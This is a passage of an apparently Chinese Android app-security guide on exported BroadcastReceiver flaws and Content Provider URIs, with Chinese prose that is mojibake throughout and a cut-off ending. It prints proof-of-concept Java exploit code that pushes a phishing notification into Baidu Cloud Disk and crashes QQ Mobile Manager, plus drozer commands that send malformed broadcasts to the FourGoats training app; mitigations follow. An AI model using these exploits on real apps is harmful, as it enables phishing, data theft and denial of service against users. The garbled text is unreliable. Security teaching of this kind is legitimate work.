<p>æš´éœ²çš„Receiverå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Receiveræ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p><a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html">ç™¾åº¦äº‘ç›˜æ‰‹æœºç‰ˆé’“é±¼ã€ä¿¡æ¯æ³„éœ²å’Œä»£ç æ‰§è¡Œé«˜å±æ¼æ´ä¸‰åˆä¸€</a></p>
<p><strong>æ¼æ´æè¿°</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç™¾åº¦äº‘ç›˜æ‰‹æœºç‰ˆå­˜åœ¨é«˜å±æ¼æ´ï¼Œæ¶æ„æ”»å‡»è€…é€šè¿‡è¯¥æ¼æ´å¯ä»¥å¯¹æ‰‹æœºç”¨æˆ·è¿›è¡Œé’“é±¼æ¬ºéª—ï¼Œç›—å–ç”¨æˆ·éšç§æ–‡ä»¶å’Œä¿¡æ¯ï¼Œä»¥ç™¾åº¦äº‘ç›˜APPæƒé™æ‰§è¡Œä»»ä½•ä»£ç ã€‚ç™¾åº¦äº‘ç›˜æœ‰ä¸€ä¸ªå¹¿æ’­æ¥æ”¶å™¨æ²¡æœ‰å¯¹æ¶ˆæ¯è¿›è¡Œå®‰å…¨éªŒè¯ï¼Œé€šè¿‡å‘é€æ¶æ„çš„æ¶ˆæ¯ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·æ‰‹æœºé€šçŸ¥æ ä¸Šæ¨é€ä»»æ„æ¶ˆæ¯ï¼Œç‚¹å‡»æ¶ˆæ¯åå¯ä»¥åˆ©ç”¨webviewç»„ä»¶ç›—å–æœ¬åœ°éšç§æ–‡ä»¶å’Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</span><br><span class="line">å­˜åœ¨æ¼æ´çš„ç»„ä»¶æ˜¯ï¼šcom<span class="selector-class">.baidu</span><span class="selector-class">.android</span><span class="selector-class">.pushservice</span><span class="selector-class">.action</span>.MESSAGE</span><br></pre></td></tr></table></figure>
<p><strong>æ”»å‡»ä»£ç </strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"> i.setAction(<span class="string">&quot;com.baidu.android.pushservice.action.MESSAGE&quot;</span>)ï¼›</span><br><span class="line"> <span class="type">Bundle</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">jsobject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"><span class="comment">//1. phishing</span></span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">custom_content_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">     jsobject.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;ç™¾åº¦äº‘ç›˜ã€æ¼æ´ä½ ä¸­å¥–äº†ï¼ã€‘&quot;</span>);</span><br><span class="line">     jsobject.put(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">     <span class="comment">//jsobject.put(&quot;url&quot;, &quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);</span></span><br><span class="line">     jsobject.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://drops.wooyun.org/webview.html&quot;</span>);</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">customcontent_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();          </span><br><span class="line">     customcontent_js.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;msg_type&quot;</span>, <span class="string">&quot;resources_push&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;uk&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;shareId&quot;</span>, <span class="string">&quot;1&quot;</span>);     </span><br><span class="line">     jsobject.put(<span class="string">&quot;custom_content&quot;</span>, customcontent_js);      </span><br><span class="line">     <span class="type">String</span> <span class="variable">cmd</span>  <span class="operator">=</span> jsobject.toString();</span><br><span class="line">     b.putByteArray(<span class="string">&quot;message&quot;</span>, cmd.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">     e.printStackTrace();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h4 id="æ‹’ç»æœåŠ¡">æ‹’ç»æœåŠ¡</h4>
<p><strong>æ¼æ´ä»‹ç»</strong></p>
<p>å¦‚æœæ•æ„Ÿçš„BroadcastReceiveræ²¡æœ‰è®¾ç½®ç›¸åº”çš„æƒé™ä¿æŠ¤ï¼Œå¾ˆå®¹æ˜“å—åˆ°æ”»å‡»ã€‚æœ€å¸¸è§çš„æ˜¯æ‹’ç»æœåŠ¡æ”»å‡»ã€‚æ‹’ç»æœåŠ¡æ”»å‡»æŒ‡çš„æ˜¯ï¼Œä¼ é€’æ¶æ„ç•¸å½¢çš„intentæ•°æ®ç»™å¹¿æ’­æ¥æ”¶å™¨ï¼Œå¹¿æ’­æ¥æ”¶å™¨æ— æ³•å¤„ç†å¼‚å¸¸å¯¼è‡´crashã€‚<br>
æ‹’ç»æœåŠ¡æ”»å‡»çš„å±å®³è§†å…·ä½“ä¸šåŠ¡åœºæ™¯è€Œå®šï¼Œæ¯”å¦‚ä¸€ä¸ªå®‰å…¨é˜²æŠ¤äº§å“çš„æ‹’ç»æœåŠ¡ã€é”å±åº”ç”¨çš„æ‹’ç»æœåŠ¡ã€æ”¯ä»˜è¿›ç¨‹çš„æ‹’ç»æœåŠ¡ç­‰å±å®³å°±æ˜¯å·¨å¤§çš„ã€‚</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>æ¡ˆä¾‹ï¼š<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html">QQæ‰‹æœºç®¡å®¶æ‹’ç»æœåŠ¡æ¼æ´</a></p>
<p><strong>æ”»å‡»ä»£ç </strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componetName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(  <span class="string">&quot;com.tencent.qqpimsecure&quot;</span>,  <span class="string">&quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;</span>);        </span><br><span class="line">i.setComponent(componetName);      </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure>
<p>æ¡ˆä¾‹2ï¼šfourgoats.apkæ‹’ç»æœåŠ¡æ”»å‡»å´©æºƒ</p>
<p>æˆ‘ä»¬é¦–å…ˆç”¨drozeræµ‹è¯•å¯å¯¼å‡ºç»„ä»¶</p>
<p><code>run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240922203759422.png" alt="image-20240922203759422"></p>
<p>æ‰¾åˆ°å¯¼å‡ºçš„ç»„ä»¶</p>
<p>æˆ‘ä»¬æ ¹æ®ç»„ä»¶çš„ç±»åæ‰¾å¯¹å¯¹åº”çš„æºç ä¿¡æ¯ï¼Œå‘ç°éœ€è¦ä¸¤ä¸ªå‚æ•° phoneNumberã€messageï¼š</p>
<p>æˆ‘ä»¬å‘é€æ¶æ„å¹¿æ’­ï¼šæ ¼å¼å¦‚ä¸‹</p>
<p><code>run app.broadcast.send --action action --extra string name lisi</code></p>
<p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message dog</code></p>
<p>æˆ‘ä»¬å†å‘å¹¿æ’­ç»„ä»¶å‘é€ä¸å®Œæ•´intentï¼Œä½¿ç”¨ç©º extrasï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨åœæ­¢è¿è¡Œï¼š</p>
<p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</code></p>
<h3 id="å®‰å…¨é˜²æŠ¤">å®‰å…¨é˜²æŠ¤</h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰ç§æœ‰å¹¿æ’­æ¥æ”¶å™¨è®¾ç½®<span class="attribute">exported</span>=â€™falseâ€™,å¹¶ä¸”ä¸é…ç½®intent-filterã€‚(ç§æœ‰å¹¿æ’­æ¥æ”¶å™¨ä¾ç„¶èƒ½æ¥æ”¶åˆ°åŒUIDçš„å¹¿æ’­)ã€‚</span><br><span class="line">ï¼ˆ2ï¼‰å¯¹æ¥æ”¶æ¥çš„å¹¿æ’­è¿›è¡ŒéªŒè¯ã€‚</span><br><span class="line">ï¼ˆ3ï¼‰å†…éƒ¨appä¹‹é—´çš„å¹¿æ’­ä½¿ç”¨<span class="attribute">protectionLevel</span>=â€™signatureâ€™ éªŒè¯å…¶æ˜¯å¦çœŸæ˜¯å†…éƒ¨appã€‚</span><br><span class="line">ï¼ˆ4ï¼‰è¿”å›ç»“æœæ—¶éœ€æ³¨æ„æ¥æ”¶appæ˜¯å¦ä¼šæ³„éœ²ä¿¡æ¯ã€‚</span><br><span class="line">ï¼ˆ5ï¼‰å‘é€çš„å¹¿æ’­åŒ…å«æ•æ„Ÿä¿¡æ¯æ—¶éœ€æŒ‡å®šå¹¿æ’­æ¥æ”¶å™¨ï¼Œä½¿ç”¨æ˜¾ç¤ºæ„å›¾æˆ–è€…setPackage(String packageName)ã€‚</span><br><span class="line">ï¼ˆ6ï¼‰ä½¿ç”¨LocalBroadcastManagerã€‚</span><br></pre></td></tr></table></figure>
<h2 id="Content-Providerç»„ä»¶ç›¸å…³æ¼æ´">Content Providerç»„ä»¶ç›¸å…³æ¼æ´</h2>
<p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªContent Providerï¼Œå…¶ä»–åº”ç”¨é€šè¿‡<strong>ContentResolver</strong>æ¥è®¿é—®æä¾›çš„æ•°æ®ï¼Œè€Œ<strong>ContentResolver</strong>é€šè¿‡uriæ¥å®šä½è‡ªå·±è¦è®¿é—®çš„æ•°æ®</p>
<h3 id="uriä»‹ç»">uriä»‹ç»</h3>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰å®šä¹‰ï¼šUniform Resource Identifierï¼Œå³ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰ä½œç”¨ï¼šå”¯ä¸€æ ‡è¯†ContentProvider <span class="meta">&amp;å…¶ä¸­çš„æ•°æ®</span></span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰å¤–ç•Œè¿›ç¨‹é€šè¿‡URLæ‰¾åˆ°å¯¹åº”çš„ContentProvider <span class="meta">&amp;å…¶ä¸­æ•°æ®ï¼Œå†è¿›è¡Œæ•°æ®æ“ä½œ</span></span><br></pre></td></tr></table></figure>
<p><strong>è‡ªå®šä¹‰URI</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_92EXMEKYH5VR3J2.png" alt="image-20210922094010216"></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰æ ‡å‡†å‰ç¼€<span class="symbol">:content</span><span class="symbol">://</span> ,ç”¨æ¥è¯´æ˜ä¸€ä¸ª<span class="title class_">Content</span> <span class="title class_">Provider</span>æ§åˆ¶è¿™äº›æ•°æ®</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰<span class="variable constant_">URL</span>çš„æ ‡è¯†ï¼šcom.carson.provider, ç”¨äºå”¯ä¸€æ ‡è¯†è¿™ä¸ª<span class="title class_">ContentProvider</span>ï¼Œå¤–éƒ¨è°ƒç”¨è€…å¯ä»¥æ ¹æ®è¿™ä¸ªæ ‡è¯†æ¥æ‰¾åˆ°å®ƒã€‚å¯¹äºç¬¬ä¸‰æ–¹ç¨‹åºï¼Œä¸ºäº†ä¿è¯<span class="variable constant_">URL</span>æ ‡è¯†çš„ä¸€è‡´æ€§ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„ã€å°å†™çš„ç±»åï¼Œè¿™ä¸ªæ ‡è¯†åœ¨å…ƒç´ çš„authoritieså±æ€§ä¸­è¯´æ˜ï¼Œä¸€èˆ¬æ˜¯å®šä¹‰è¯¥<span class="title class_">ContentProvider</span>çš„åŒ….ç±»çš„åç§°</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰è·¯å¾„ï¼š<span class="title class_">User</span>,è¦æ“ä½œçš„æ•°æ®åº“ä¸­è¡¨çš„åå­—ï¼Œæˆ–è€…å¯ä»¥è‡ªå·±å®šä¹‰ï¼Œè®°å¾—åœ¨ä½¿ç”¨çš„æ—¶å€™ä¿æŒä¸€è‡´</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰è®°å½•<span class="variable constant_">ID</span><span class="symbol">:id</span>, å¦‚æœ<span class="variable constant_">URL</span>ä¸­åŒ…å«è¡¨ç¤ºéœ€è¦è·å–çš„è®°å½•<span class="variable constant_">ID</span>,åˆ™è¿”å›è¯¥idå¯¹åº”çš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰<span class="variable constant_">ID</span>,å°±è¡¨ç¤ºè¿”å›å…¨éƒ¨</span><br></pre></td></tr></table></figure>
<p>è‹¥è¦å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆURIï¼Œå¯ä»¥ä½¿ç”¨parse</p>
<p><code>Uri uri </code>=<code> </code>Uri.parse(<code>&quot;content://com.carson.provider/User&quot;</code>)ï¼›</p>
<p><strong>ç»™å‡ºä¸€ä¸ªURIç¤ºä¾‹</strong></p>
<p><code>http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&amp;name=jack</code></p>
<p>è·å¾—URIçš„å„ä¸ªéƒ¨åˆ†ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getScheme</span><span class="params">()</span></span>ï¼šè·å– Uri ä¸­çš„ scheme å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œåœ¨è¿™é‡Œæ˜¯ http</span><br><span class="line"><span class="function"><span class="title">getHost</span><span class="params">()</span></span>ï¼šè·å– Authority ä¸­çš„ Host å­—ç¬¦ä¸²ï¼Œå³ www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br><span class="line"><span class="function"><span class="title">getPost</span><span class="params">()</span></span>ï¼šè·å– Authority ä¸­çš„ Port å­—ç¬¦ä¸²ï¼Œå³ <span class="number">8080</span></span><br><span class="line"><span class="function"><span class="title">getPath</span><span class="params">()</span></span>ï¼šè·å– Uri ä¸­ <span class="selector-tag">path</span> éƒ¨åˆ†ï¼Œå³ wenku/jiatiao<span class="selector-class">.html</span></span><br><span class="line"><span class="function"><span class="title">getQuery</span><span class="params">()</span></span>ï¼šè·å– Uri ä¸­çš„ query éƒ¨åˆ†ï¼Œå³ id=<span class="number">15</span>&amp;name=jack</span><br><span class="line"><span class="function"><span class="title">getSchemeSpecificPart</span><span class="params">()</span></span>ï¼šåŸŸå+ç«¯å£å·+è·¯å¾„+å‚æ•°</span><br><span class="line">getAuthorityï¼šè·å–ç”¨æˆ·ä¿¡æ¯+åŸŸå+ç«¯å£å·</span><br><span class="line">getUserInfoï¼šè·å–ç”¨æˆ·ä¿¡æ¯æ•°æ®</span><br></pre></td></tr></table></figure>
<p><strong>MIME</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ldld1717/article/details/52180017">https://blog.csdn.net/ldld1717/article/details/52180017</a></p>
<p>MIMEæ˜¯æŒ‡å®šæŸä¸€ä¸ªæ‹“å±•åçš„æ–‡ä»¶ç”¨é‚£ä¸€ç§åº”ç”¨ç¨‹åºæ‰“å¼€</p>
<p>å°±åƒç”¨æµè§ˆå™¨æŸ¥çœ‹PDFæ ¼å¼çš„æ–‡ä»¶ï¼Œæµè§ˆå™¨ä¼šé€‰æ‹©åˆé€‚çš„åº”ç”¨æ‰“å¼€ã€‚ContentProvider ä¼šæ ¹æ® URI æ¥è¿”å› MIME ç±»å‹ï¼ŒContentProvider ä¼šè¿”å›ä¸€ä¸ªåŒ…å«ä¸¤éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚MIME ç±»å‹ä¸€èˆ¬åŒ…å«ä¸¤éƒ¨åˆ†ï¼Œå¦‚ï¼š</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>/html</span><br><span class="line"><span class="built_in">text</span>/css</span><br><span class="line"><span class="built_in">text</span>/xml</span><br><span class="line"><span class="built_in">application</span>/pdf</span><br></pre></td></tr></table></figure>
<p>åˆ†ä¸ºç±»å‹å’Œå­ç±»å‹ï¼ŒAndroid éµå¾ªç±»ä¼¼çš„çº¦å®šæ¥å®šä¹‰MIMEç±»å‹ï¼Œæ¯ä¸ªå†…å®¹ç±»å‹çš„ Android MIME ç±»å‹æœ‰ä¸¤ç§å½¢å¼ï¼šå¤šæ¡è®°å½•ï¼ˆé›†åˆï¼‰å’Œå•æ¡è®°å½•ã€‚</p>
<ul>
<li>
<p>é›†åˆè®°å½•(dir):<br>
vnd.android.cursor.<code>dir</code>/``è‡ªå®šä¹‰</p>
</li>
<li>
<p>å•æ¡è®°å½•(item)ï¼š</p>
<p>vnd.android.cursor.item/è‡ªå®šä¹‰</p>
</li>
</ul>
<p>vnd è¡¨ç¤ºè¿™äº›ç±»å‹å’Œå­ç±»å‹å…·æœ‰éæ ‡å‡†çš„ã€ä¾›åº”å•†ç‰¹å®šçš„å½¢å¼ã€‚Androidä¸­ç±»å‹å·²ç»å›ºå®šå¥½äº†ï¼Œä¸èƒ½æ›´æ”¹ï¼Œåªèƒ½åŒºåˆ«æ˜¯é›†åˆè¿˜æ˜¯å•æ¡å…·ä½“è®°å½•ï¼Œå­ç±»å‹å¯ä»¥æŒ‰ç…§æ ¼å¼è‡ªå·±å¡«å†™ï¼Œåœ¨ä½¿ç”¨ Intent æ—¶ï¼Œä¼šç”¨åˆ° MIMEï¼Œæ ¹æ® Mimetype æ‰“å¼€ç¬¦åˆæ¡ä»¶çš„æ´»åŠ¨ã€‚</p>
<h3 id="URIè§£æ">URIè§£æ</h3>
<p>è¿™é‡ŒURIä»£è¡¨è¦æ“ä½œçš„æ•°æ®ï¼Œæˆ‘ä»¬åœ¨å¯¹æ•°æ®è¿›è¡Œè·å–æ—¶éœ€è¦è§£æURIï¼ŒAndroidæä¾›äº†ä¸¤ä¸ªæ“ä½œURIçš„å·¥å…·ç±»ï¼š<strong>UriMatcher</strong> å’Œ <strong>ContentUris</strong></p>
<p><strong>UriMatcher</strong></p>
<ul>
<li>å°†éœ€è¦åŒ¹é…çš„Uriè·¯å¾„è¿›è¡Œæ³¨å†Œ</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¸¸é‡UriMatcher.NO_MATCHè¡¨ç¤ºä¸åŒ¹é…ä»»ä½•è·¯å¾„çš„è¿”å›ç </span></span><br><span class="line"><span class="type">UriMatcher</span>  <span class="variable">sMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class="line"><span class="comment">//å¦‚æœmatch()æ–¹æ³•åŒ¹é…â€œcontent://com.wang.provider.myprovider/tablenameâ€è·¯å¾„ï¼Œè¿”å›åŒ¹é…ç ä¸º1</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;content://com.wang.provider.myprovider&quot;</span>, <span class="string">&quot; tablename &quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//å¦‚æœmatch()æ–¹æ³•åŒ¹é…content://com.wang.provider.myprovider/tablename/11è·¯å¾„ï¼Œè¿”å›åŒ¹é…ç ä¸º2</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;com.wang.provider.myprovider&quot;</span>, <span class="string">&quot;tablename/#&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„é‡‡ç”¨ addURI æ³¨å†Œäº†ä¸¤ä¸ªéœ€è¦ç”¨åˆ°çš„ URIï¼›æ³¨æ„ï¼Œæ·»åŠ ç¬¬äºŒä¸ª URI æ—¶ï¼Œè·¯å¾„åé¢çš„ id é‡‡ç”¨äº†é€šé…ç¬¦å½¢å¼ â€œ#â€ï¼Œè¡¨ç¤ºåªè¦å‰é¢éƒ¨åˆ†éƒ½åŒ¹é…ä¸Šäº†å°± OK</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*:è¡¨ç¤ºåŒ¹é…ä»»æ„é•¿åº¦çš„ä»»æ„å­—ç¬¦</span><br><span class="line"><span class="comment">#:è¡¨ç¤ºåŒ¹é…ä»»æ„é•¿åº¦çš„æ•°å­—</span></span><br><span class="line">åŒ¹é…ä»»æ„è¡¨çš„å†…å®¹URIæ ¼å¼ï¼š</span><br><span class="line">contentï¼š<span class="regexp">//</span>com.example.app.provider/*</span><br><span class="line">åŒ¹é…tableè¡¨ä¸­<span class="number">1</span>ä»»æ„ä¸€è¡Œæ•°æ®çš„å†…å®¹URIæ ¼å¼ï¼š</span><br><span class="line">contentï¼š<span class="regexp">//</span>com.example.app.procider<span class="regexp">/table/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>æ³¨å†Œå®Œéœ€è¦åŒ¹é…çš„ Uri åï¼Œå¯ä»¥ä½¿ç”¨ sMatcher.match(Uri) æ–¹æ³•å¯¹è¾“å…¥çš„ Uri è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…å°±è¿”å›å¯¹åº”çš„åŒ¹é…ç ï¼ŒåŒ¹é…ç ä¸ºè°ƒç”¨ addURI() æ–¹æ³•æ—¶ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (sMatcher.match(Uri.parse(<span class="string">&quot;content://com.zhang.provider.yourprovider/tablename/100&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="comment">//match 1, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span></span><br><span class="line">      <span class="comment">//match 2, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//match nothing, todo something</span></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>ContentUris</strong></p>
<p>ContentUrisç±»ç”¨äºæ“ä½œUriè·¯å¾„åé¢çš„IDéƒ¨åˆ†ï¼Œæœ‰ä¸¤ä¸ªå¸¸ç”¨æ–¹æ³•ï¼š</p>
<p>withAppendedId(Uri uri, long id)å’ŒparseId(Uri uri)</p>
<ul>
<li>
<p>withAppendedId(Uri uri, long id)ç”¨äºä¸ºè·¯å¾„åŠ ä¸ŠIDéƒ¨åˆ†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"><span class="comment">//ç”Ÿæˆçš„Uriä¸ºï¼šcontent://com.wang.provider.myprovider/tablename/10</span></span><br><span class="line"> <span class="type">Uri</span> <span class="variable">resultUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">10</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>parseId(Uri uri)åˆ™ä»è·¯å¾„ä¸­è·å–IDéƒ¨åˆ†:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.zhang.provider.myprovider/tablename/10&quot;</span>)</span><br><span class="line"><span class="comment">//è·å–çš„ç»“æœä¸ºï¼š10</span></span><br><span class="line"><span class="type">long</span> <span class="variable">personid</span> <span class="operator">=</span> ContentUris.parseId(uri);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="ContentProvideræ“ä½œæ•°æ®">ContentProvideræ“ä½œæ•°æ®</h3>
<p>å½“å¤–éƒ¨åº”ç”¨éœ€è¦å¯¹ContentProviderä¸­çš„æ•°æ®è¿›è¡Œæ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹åŠæŸ¥è¯¢æ“ä½œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ContentResolverç±»æ¥å®Œæˆï¼Œè¦è·å–ContentResolverå¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨Activityæä¾›getContentResolver()</p>
<p>ContentResolverç±»æä¾›äº†ä¸ContentProviderç±»ç›¸åŒç­¾åçš„å››ä¸ªæ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>ï¼Œå¾€ContentProvideræ·»åŠ æ•°æ®ï¼›</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>ï¼Œä»ContentProvideråˆ é™¤æ•°æ®ï¼›</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>ï¼Œæ›´æ–°ContentProviderä¸­çš„æ•°æ®ï¼›</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String 